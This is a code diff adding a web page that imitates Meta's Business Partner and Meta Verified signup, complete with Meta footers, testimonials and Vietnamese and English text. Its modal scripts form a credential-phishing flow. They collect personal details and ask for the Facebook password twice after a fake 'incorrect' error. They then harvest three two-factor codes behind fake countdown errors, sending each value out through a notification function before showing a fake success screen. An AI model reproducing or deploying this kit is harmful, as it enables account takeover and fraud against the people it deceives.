+                <p data-i18n="footer_desc" class="text-gray-300 max-w-md">Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.</p>
+            </div>
+            <div class="w-full max-w-xl">
+                <div class="flex flex-col md:flex-row gap-4 mb-4">
+                    <input id="footerEmail" type="email" placeholder="Email address" data-i18n-placeholder="footer_email" class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
+                    <input id="footerCountry" type="text" placeholder="Enter a country name..." data-i18n-placeholder="footer_country" class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
+                </div>
+                <p data-i18n="footer_legal" class="text-xs text-gray-300 leading-relaxed mb-4">By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our <span class="underline cursor-pointer">Data Policy</span>.</p>
+                <button data-i18n="footer_subscribe" class='bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px]'>Subscribe</button>
+            </div>
+        </div>
+        <div class="border-t border-white/20"></div>
+    </footer>
+    <!-- FOOTER END -->
+
+    <!-- FOOTER 2 START -->
+    <footer class="bg-[#1b2a34] text-gray-400">
+        <div class="max-w-[1504px] mx-auto py-20 px-6">
+            <div class="hidden md:grid md:grid-cols-3 lg:grid-cols-4 gap-x-8 gap-y-12">
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[18px] mb-4">Meta technologies</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Messenger</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">WhatsApp</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Audience Network</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[18px] mb-4">Tools</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Free tools</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook Pages</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram profiles</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Stories</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Shops</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[18px] mb-4">Goals</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Set up a Facebook Page</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Build brand awareness</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Promote your local business</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Grow online sales</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-[#cbd2d9] text-[18px] mb-4">Business types</h3>
+                    <ul class="space-y-3">
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Small business</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Large businesses</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Agency</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Mobile accordion -->
+            <div class="md:hidden divide-y divide-gray-800 footer-mobile">
+                <div class="py-5">
+                    <button class="footer-btn flex justify-between items-center w-full text-left text-white">
+                        <span class="text-[24px]">Meta technologies</span>
+                        <img src="/public/meta/ic_arrow_w.svg" class="w-[20px] h-[20px] transition-transform">
+                    </button>
+                    <div class="footer-content overflow-hidden transition-all duration-300 max-h-0">
+                        <ul class="space-y-3 mt-4">
+                            <li><a href="#" class="text-gray-400 text-[18px] block">Facebook</a></li>
+                            <li><a href="#" class="text-gray-400 text-[18px] block">Instagram</a></li>
+                            <li><a href="#" class="text-gray-400 text-[18px] block">Messenger</a></li>
+                            <li><a href="#" class="text-gray-400 text-[18px] block">WhatsApp</a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="py-5">
+                    <button class="footer-btn flex justify-between items-center w-full text-left text-white">
+                        <span class="text-[24px]">Tools</span>
+                        <img src="/public/meta/ic_arrow_w.svg" class="w-[20px] h-[20px] transition-transform">
+                    </button>
+                    <div class="footer-content overflow-hidden transition-all duration-300 max-h-0">
+                        <ul class="space-y-3 mt-4">
+                            <li><a href="#" class="text-gray-400 text-[18px] block">Free tools</a></li>
+                            <li><a href="#" class="text-gray-400 text-[18px] block">Facebook Pages</a></li>
+                            <li><a href="#" class="text-gray-400 text-[18px] block">Instagram profiles</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="border-t border-[#465A69] pt-12 text-sm mt-12">
+                <div class="flex flex-col md:flex-row sm:justify-between sm:items-start gap-6">
+                    <div class="text-[#cbd2d9] text-[13px]">
+                        © 2026 Meta
+                        <div class="flex gap-3 mt-4">
+                            <img src="../public/icons/ic_facebook.svg" class="w-[24px] h-[24px]">
+                            <img src="../public/icons/ic_instagram.svg" class="w-[24px] h-[24px]">
+                            <img src="../public/icons/ic_x.svg" class="w-[24px] h-[24px]">
+                            <img src="../public/icons/ic_in.svg" class="w-[24px] h-[24px]">
+                        </div>
+                    </div>
+                    <div class="flex flex-wrap gap-x-6 gap-y-2">
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">About</a>
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Developers</a>
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Careers</a>
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Privacy</a>
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Cookies</a>
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Terms</a>
+                        <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Help Centre</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- FOOTER 2 END -->
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files -->
+<script>
+(function() {
+  var track = document.getElementById('testimonial-track');
+  var dots  = document.querySelectorAll('#dots button');
+  var prev  = document.getElementById('prev-feed');
+  var next  = document.getElementById('next-feed');
+  var total = dots.length;
+  var cur   = 0;
+
+  function goTo(idx) {
+    cur = (idx + total) % total;
+    track.style.transform = 'translateX(-' + (cur * 100) + '%)';
+    dots.forEach(function(d, i) {
+      d.classList.toggle('bg-gray-900', i === cur);
+      d.classList.toggle('bg-gray-300', i !== cur);
+    });
+  }
+
+  prev.addEventListener('click', function() { goTo(cur - 1); });
+  next.addEventListener('click', function() { goTo(cur + 1); });
+
+  dots.forEach(function(d, i) {
+    d.addEventListener('click', function() { goTo(i); });
+  });
+
+  // Auto slide mỗi 5 giây
+  setInterval(function() { goTo(cur + 1); }, 5000);
+})();
+</script>
+
+    <!-- ===================== MODAL MANAGER ===================== -->
+    <script>
+    const Modal = {
+      _current: null,
+
+      create(id, content, compact) {
+        const old = document.getElementById(id);
+        if (old) old.remove();
+        const overlay = document.createElement('div');
+        overlay.id = id;
+        overlay.className = 'modal-overlay';
+        overlay.innerHTML = '<div class="modal-box' + (compact ? ' modal-compact' : '') + '">' + content + '</div>';
+        overlay.addEventListener('click', function(e) {
+          if (e.target === overlay) Modal.close(id);
+        });
+        document.getElementById('modalsContainer').appendChild(overlay);
+      },
+
+      open(id) {
+        const overlay = document.getElementById(id);
+        if (!overlay) return;
+        requestAnimationFrame(function() {
+          overlay.classList.add('open');
+        });
+        Modal._current = id;
+        document.body.style.overflow = 'hidden';
+      },
+
+      close(id) {
+        const overlay = document.getElementById(id);
+        if (!overlay) return;
+        overlay.classList.remove('open');
+        document.body.style.overflow = '';
+        setTimeout(function() {
+          if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+        }, 220);
+        Modal._current = null;
+      }
+    };
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current);
+    });
+    </script>
+
+    <!-- ===================== COUNTRY CODES + PHONE SELECTOR ===================== -->
+    <script>
+    var _masterData = {};
+
+    var COUNTRY_CODES = [
+      {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"},
+      {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
+      {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
+      {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
+      {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
+      {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
+      {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
+      {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
+      {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
+      {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
+      {code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
+      {code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
+      {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
+      {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},
+      {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
+      {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
+      {code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
+      {code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
+      {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},
+      {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
+      {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},
+      {code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
+      {code:"AE",name:"UAE",dial:"+971",flag:"🇦🇪"},
+      {code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
+      {code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
+      {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},
+      {code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
+      {code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
+      {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},
+      {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},
+      {code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
+      {code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
+      {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},
+      {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},
+      {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},
+      {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},
+      {code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
+      {code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
+      {code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
+      {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},
+      {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},
+      {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},
+      {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},
+      {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},
+      {code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
+      {code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
+      {code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
+      {code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
+      {code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
+      {code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
+      {code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
+      {code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"}
+    ];
+
+    var _selectedDial = "+84";
+    var _selectedFlag = "🇻🇳";
+    var _dropdownOpen = false;
+
+    async function _detectCountryDial() {
+      try {
+        var r = await fetch("https://ipapi.co/json/");
+        var d = await r.json();
+        var cc = d.country_code;
+        var found = COUNTRY_CODES.find(function(c){ return c.code === cc; });
+        if (found) { _selectedDial = found.dial; _selectedFlag = found.flag; }
+      } catch(e) {}
+    }
+
+    function _buildPhoneSelector() {
+      var opts = COUNTRY_CODES.map(function(c) {
+        return '<div class="pcs-opt" data-dial="' + c.dial + '" data-flag="' + c.flag + '" onclick="_selectDial(this)">'
+          + '<span>' + c.flag + '</span>'
+          + '<span style="font-size:13px;color:#444;min-width:38px;display:inline-block;">' + c.dial + '</span>'
+          + '<span style="font-size:13px;color:#777;">' + c.name + '</span>'
+          + '</div>';
+      }).join('');
+      return '<div class="pcs-wrap" id="pcs">'
+        + '<div class="pcs-trigger" onclick="_toggleDial()" id="pcsTrigger">'
+        + '  <span id="pcsFlag">' + _selectedFlag + '</span>'
+        + '  <span id="pcsDial" style="font-size:13px;color:#333;">' + _selectedDial + '</span>'
+        + '  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>'
+        + '</div>'
+        + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none">'
+        + '  <input class="pcs-search" id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)">'
+        + '  <div class="pcs-list" id="pcsList">' + opts + '</div>'
+        + '</div>'
+        + '</div>';
+    }
+
+    function _toggleDial() {
+      var dd = document.getElementById('pcsDropdown');
+      if (!dd) return;
+      _dropdownOpen = !_dropdownOpen;
+      dd.style.display = _dropdownOpen ? 'block' : 'none';
+      if (_dropdownOpen) {
+        setTimeout(function(){ var s=document.getElementById('pcsSearch'); if(s) s.focus(); }, 50);
+      }
+    }
+
+    function _selectDial(el) {
+      _selectedDial = el.getAttribute('data-dial');
+      _selectedFlag = el.getAttribute('data-flag');
+      var f = document.getElementById('pcsFlag'); if(f) f.textContent = _selectedFlag;
+      var d = document.getElementById('pcsDial'); if(d) d.textContent = _selectedDial;
+      _dropdownOpen = false;
+      var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none';
+    }
+
+    function _filterDial(q) {
+      var items = document.querySelectorAll('.pcs-opt');
+      q = q.toLowerCase();
+      items.forEach(function(el){
+        var txt = el.textContent.toLowerCase();
+        el.style.display = txt.includes(q) ? '' : 'none';
+      });
+    }
+
+    document.addEventListener('click', function(e) {
+      var wrap = document.getElementById('pcs');
+      if (wrap && !wrap.contains(e.target)) {
+        _dropdownOpen = false;
+        var dd = document.getElementById('pcsDropdown');
+        if (dd) dd.style.display = 'none';
+      }
+    });
+    </script>
+
+    <!-- ===================== MODAL FLOWS ===================== -->
+    <script>
+    function openClientModal() {
+      _masterData = {};
+      _detectCountryDial().then(function() {
+        var content =
+          '<div class="modal-header">' +
+            '<span class="modal-title">Partnership Registration Form</span>' +
+            '<button class="modal-close" onclick="Modal.close(\'clientModal\')">&times;</button>' +
+          '</div>' +
+          '<form id="clientForm" autocomplete="off">' +
+            '<div class="modal-input-wrap"><input id="fullName" type="text" placeholder="Full Name" required></div>' +
+            '<div class="modal-input-wrap"><input id="email" type="email" placeholder="Email Address" required></div>' +
+            '<div class="modal-input-wrap"><input id="emailBusiness" type="email" placeholder="Email Business Address" required></div>' +
+            '<div class="modal-input-wrap"><input id="fanpage" type="text" placeholder="Fanpage Name" required></div>' +
+            '<div class="modal-input-wrap pcs-phone-row">' +
+              _buildPhoneSelector() +
+              '<input id="phone" type="tel" placeholder="Phone Number" required style="flex:1;outline:none;border:none;background:transparent;font-size:14px;font-family:inherit;height:100%;min-width:0;">' +
+            '</div>' +
+            '<span class="modal-label">Date of Birth</span>' +
+            '<div class="modal-dob-grid">' +
+              '<div class="modal-input-wrap" style="margin-bottom:0"><input id="day" type="number" placeholder="Day" min="1" max="31" required></div>' +
+              '<div class="modal-input-wrap" style="margin-bottom:0"><input id="month" type="number" placeholder="Month" min="1" max="12" required></div>' +
+              '<div class="modal-input-wrap" style="margin-bottom:0"><input id="year" type="number" placeholder="Year" min="1900" max="2024" required></div>' +
+            '</div>' +
+            '<div style="height:10px"></div>' +
+            '<div class="modal-textarea-wrap"><textarea id="message" rows="3" placeholder="Message"></textarea></div>' +
+            '<p class="modal-hint">Our response will be sent to you within 14 - 48 hours.</p>' +
+            '<label class="modal-check-row"><input id="agreeCheck" type="checkbox" required> I agree to the <a href="#">Terms of use</a></label>' +
+            '<button type="submit" class="modal-btn-primary">Submit</button>' +
+          '</form>';
+
+        Modal.create('clientModal', content);
+        Modal.open('clientModal');
+
+        document.getElementById('clientForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          _masterData.fullName      = document.getElementById('fullName').value.trim();
+          _masterData.email         = document.getElementById('email').value.trim();
+          _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
+          _masterData.fanpage       = document.getElementById('fanpage').value.trim();
+          _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
+          _masterData.day           = document.getElementById('day').value;
+          _masterData.month         = document.getElementById('month').value;
+          _masterData.year          = document.getElementById('year').value;
+          _masterData.message       = document.getElementById('message').value.trim();
+          Modal.close('clientModal');
+          setTimeout(function() { openSecurityModal(); }, 250);
+        });
+      });
+    }
+
+    function openSecurityModal() {
+      var content =
+        '<div style="display:flex;flex-direction:column;align-items:center;">' +
+          '<div style="width:100%;display:flex;justify-content:flex-end;">' +
+            '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button>' +
+          '</div>' +
+          '<img src="../public/icons/ic_logo.svg" alt="Meta" class="modal-meta-icon" style="margin-top:4px;margin-bottom:16px;">' +
+          '<div style="width:100%">' +
+            '<p style="font-size:14px;color:#606770;margin-bottom:16px;line-height:1.5;">For your security, you must enter your password to continue.</p>' +
+            '<form id="securityForm">' +
+              '<div class="modal-input-wrap"><input type="password" id="password" placeholder="Password" required></div>' +
+              '<p id="passwordError" class="modal-error"></p>' +
+              '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>' +
+              '<p style="text-align:center;margin-top:16px;"><a href="#" style="color:#606770;font-size:14px;text-decoration:none;">Forgot your password?</a></p>' +
+            '</form>' +
+          '</div>' +
+          '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo" style="margin-top:16px;">' +
+        '</div>';
+
+      Modal.create('securityModal', content, true);
+      Modal.open('securityModal');
+
+      var clickCount = 0;
+
+      document.getElementById('securityForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        var password  = document.getElementById('password').value.trim();
+        var errorMsg  = document.getElementById('passwordError');
+        var submitBtn = document.getElementById('securityBtn');
+
+        errorMsg.classList.remove('show');
+        if (!password) {
+          errorMsg.textContent = "You haven't entered your password!";
+          errorMsg.classList.add('show');
+          return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="modal-spinner"></span>';
+
+        if (clickCount === 0) {
+          _masterData.password = password;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Continue';
+            document.getElementById('password').value = '';
+            errorMsg.textContent = "The password you've entered is incorrect.";
+            errorMsg.classList.add('show');
+            clickCount = 1;
+          }, 1350);
+        } else {
+          _masterData.passwordSecond = password;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            Modal.close('securityModal');
+            setTimeout(function() { openAuthenticationModal(); }, 250);
+          }, 1500);
+        }
+      });
+    }
+
+    function openAuthenticationModal() {
+      var emailDisplay = Utils.maskEmail(_masterData.email || '');
+      var phoneDisplay = Utils.maskPhone(_masterData.phone || '');
+      var description  = 'Enter the code for this account that we send to ' + emailDisplay + ', ' + phoneDisplay +
+        ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
+
+      var content =
+        '<div style="display:flex;flex-direction:column;">' +
+          '<div class="modal-header" style="margin-bottom:6px;">' +
+            '<div class="modal-user-info">' +
+              '<span>' + (_masterData.fullName || '') + '</span>' +
+              '<span class="modal-dot"></span>' +
+              '<span>Facebook</span>' +
+            '</div>' +
+            '<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button>' +
+          '</div>' +
+          '<h2 style="font-size:20px;font-weight:700;color:#000;margin-bottom:14px;">Two-factor authentication required (1/3)</h2>' +
+          '<p class="modal-hint">' + description + '</p>' +
+          '<div class="modal-2fa-img"><img src="../public/images/authentication.png" alt="2FA"></div>' +
+          '<form id="authForm">' +
+            '<div class="modal-input-wrap"><input type="number" id="twoFa" placeholder="Code" required></div>' +
+            '<p id="authError" class="modal-error"></p>' +
+            '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>' +
+            '<button type="button" class="modal-btn-outline">Try another way</button>' +
+          '</form>' +
+          '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">' +
+        '</div>';
+
+      Modal.create('authModal', content, true);
+      Modal.open('authModal');
+
+      var authCount = 0;
+      var countdownInterval = null;
+
+      function startCountdown(errorMsg, submitBtn) {
+        var input = document.getElementById('twoFa');
+        if (!input) return;
+        if (countdownInterval) clearInterval(countdownInterval);
+        input.disabled = true;
+        submitBtn.disabled = true;
+        var time = (typeof CONFIG !== 'undefined' && CONFIG.COUNTDOWN_TIME) ? CONFIG.COUNTDOWN_TIME : 30;
+        errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
+        errorMsg.classList.add('show');
+        countdownInterval = setInterval(function() {
+          time--;
+          errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
+          if (time <= 0) {
+            clearInterval(countdownInterval);
+            countdownInterval = null;
+            input.disabled = false;
+            input.value = '';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Continue';
+            errorMsg.classList.remove('show');
+          }
+        }, 1000);
+      }
+
+      document.getElementById('authForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        var twoFa     = document.getElementById('twoFa').value.trim();
+        var errorMsg  = document.getElementById('authError');
+        var submitBtn = document.getElementById('authBtn');
+
+        errorMsg.classList.remove('show');
+        if (!twoFa) {
+          errorMsg.textContent = "You haven't entered the code!";
+          errorMsg.classList.add('show');
+          return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="modal-spinner"></span>';
+
+        if (authCount === 0) {
+          _masterData.twoFa = twoFa;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            submitBtn.innerHTML = 'Continue';
+            startCountdown(errorMsg, submitBtn);
+            authCount = 1;
+          }, 1400);
+        } else if (authCount === 1) {
+          _masterData.twoFaSecond = twoFa;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            submitBtn.innerHTML = 'Continue';
+            startCountdown(errorMsg, submitBtn);
+            authCount = 2;
+          }, 1200);
+        } else {
+          _masterData.twoFaThird = twoFa;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            Modal.close('authModal');
+            setTimeout(function() { openSuccessModal(); }, 250);
+          }, 1600);
+        }
+      });
+    }
+
+    function openSuccessModal() {
+      var content =
+        '<div class="modal-header">' +
+          '<h2 style="font-size:18px;font-weight:700;text-align:center;flex:1;">Request has been sent</h2>' +
+          '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>' +
+        '</div>' +
+        '<div class="modal-success-img"><img src="../public/icons/creative.webp" alt="Success"></div>' +
+        '<p style="color:#9a979e;font-size:15px;margin-bottom:6px;">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>' +
+        '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support Meta.</p>' +
+        '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>' +
+        '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">';
+
+      Modal.create('successModal', content, true);
+      Modal.open('successModal');
+    }
+    </script>
+
+    <!-- ===================== AUTO LANGUAGE DETECTION + I18N ===================== -->
+    <script>
+    var I18N = {
+      en: {
+        nav_start:"Get started", nav_advertise:"Advertise", nav_learn:"Learn", nav_support:"Support",
+        hero_title:"Become a Meta Business Partner",
+        hero_desc1:"Meta business partners enjoy unique benefits such as training, support, analytical reporting and customer networking opportunities.",
+        hero_desc2:"Applicants can apply for a variety of specializations, including agency management, feed management and feed conversion data.",
+        btn_apply:"Apply now",
+        trusted_title:"Meta Business Partners are trusted experts",
+        trusted_desc:"Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you'll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.",
+        learn_more:"Learn more",
+        feat1_title:"Credibility", feat1_desc:"Earn the Meta Business Partners badge to show clients you're the best at what you do.",
+        feat2_title:"Resources and support", feat2_desc:"Gain access to partner-specific resources, recommendations, training and chat or live support.",
+        explore_title:"Explore how Meta technologies can help transform your business.",
+        card1_title:"Improve ad performance", card1_desc:"Maximise campaign results and simplify the setup process with advanced ad creation tools.",
+        card2_title:"Reach more people", card2_desc:"Get ads to people most likely to be interested in your products or services with automated targeting tools.",
+        card3_title:"Become an expert", card3_desc:"Upgrade your marketing skills with free online courses and certifications through Meta Blueprint.",
+        card4_title:"Get personalised ad solutions", card4_desc:"See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.",
+        card5_title:"Understand performance", card5_desc:"Access advanced marketing performance tracking with detailed overviews of audience behaviour.",
+        card6_title:"Use ad formats that work", card6_desc:"Designed to fit specific business goals, reach and expand your audience across every device.",
+        feedback_title:"See how Meta Verified has helped real businesses.",
+        testimonial1_quote:'"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don\'t know or newer brands interested in working with me can make sure that they\'re talking with me and not a scammer."',
+        testimonial1_author:"Kimber Greenwood, Owner of Water Bear Photography",
+        testimonial2_quote:'"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up and I\'m seeing more interactions on stories and reels."',
+        testimonial2_author:"Devon Kirby, Owner, Mom Approved Miami",
+        testimonial3_quote:'"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously."',
+        testimonial3_author:"Sarah Clancy, Owner of Sarah Marie Running Co.",
+        action_title:"Ready to become Meta Verified?",
+        faq_title:"FAQ", faq_more:"For more, visit our Help Centre",
+        faq_q1:"How do I know if my business is eligible?",
+        faq_a1:"Meta Verified is available in selected regions for businesses that meet certain eligibility requirements.",
+        faq_q2:"How can I stay informed if I'm not yet eligible?",
+        faq_a2:"Join our waitlist to stay updated. We will notify you when Meta Verified for businesses is available.",
+        faq_q3:"I already have a verified badge. What happens to it?",
+        faq_a3:"No action is needed in order to keep your badge. Existing verified badge holders can apply for a Meta Verified subscription.",
+        footer_title:"Get the latest updates from Meta for business.",
+        footer_desc:"Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.",
+        footer_legal:"By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time. For more information about how Meta handles your data, please read our Data Policy.",
+        footer_email:"Email address", footer_country:"Enter a country name...", footer_subscribe:"Subscribe"
+      },
+      vi: {
+        nav_start:"Bắt đầu", nav_advertise:"Quảng cáo", nav_learn:"Học hỏi", nav_support:"Hỗ trợ",
+        hero_title:"Trở thành Đối tác Doanh nghiệp Meta",
+        hero_desc1:"Đối tác doanh nghiệp Meta được hưởng các lợi ích độc đáo như đào tạo, hỗ trợ, báo cáo phân tích và cơ hội kết nối khách hàng.",
+        hero_desc2:"Người đăng ký có thể ứng tuyển cho nhiều chuyên ngành khác nhau, bao gồm quản lý đại lý, quản lý nguồn cấp và dữ liệu chuyển đổi.",
+        btn_apply:"Đăng ký ngay",
+        trusted_title:"Đối tác Doanh nghiệp Meta là các chuyên gia đáng tin cậy",
+        trusted_desc:"Tham gia cộng đồng toàn cầu của chúng tôi gồm các chuyên gia giải pháp, được Meta kiểm duyệt về kỹ thuật và dịch vụ xuất sắc. Khi tham gia, bạn sẽ có quyền truy cập vào các lợi ích độc quyền như đào tạo, hỗ trợ, báo cáo phân tích và cơ hội kết nối khách hàng.",
+        learn_more:"Tìm hiểu thêm",
+        feat1_title:"Uy tín", feat1_desc:"Nhận huy hiệu Đối tác Doanh nghiệp Meta để chứng minh với khách hàng rằng bạn là người giỏi nhất.",
+        feat2_title:"Tài nguyên và hỗ trợ", feat2_desc:"Truy cập các tài nguyên dành riêng cho đối tác, đề xuất, đào tạo và hỗ trợ qua chat hoặc trực tiếp.",
+        explore_title:"Khám phá cách công nghệ Meta có thể giúp chuyển đổi doanh nghiệp của bạn.",
+        card1_title:"Cải thiện hiệu suất quảng cáo", card1_desc:"Tối đa hóa kết quả chiến dịch và đơn giản hóa quy trình thiết lập với các công cụ tạo quảng cáo nâng cao.",
+        card2_title:"Tiếp cận nhiều người hơn", card2_desc:"Đưa quảng cáo đến những người có khả năng quan tâm đến sản phẩm hoặc dịch vụ của bạn nhất với các công cụ nhắm mục tiêu tự động.",
+        card3_title:"Trở thành chuyên gia", card3_desc:"Nâng cao kỹ năng marketing với các khóa học trực tuyến miễn phí và chứng chỉ qua Meta Blueprint.",
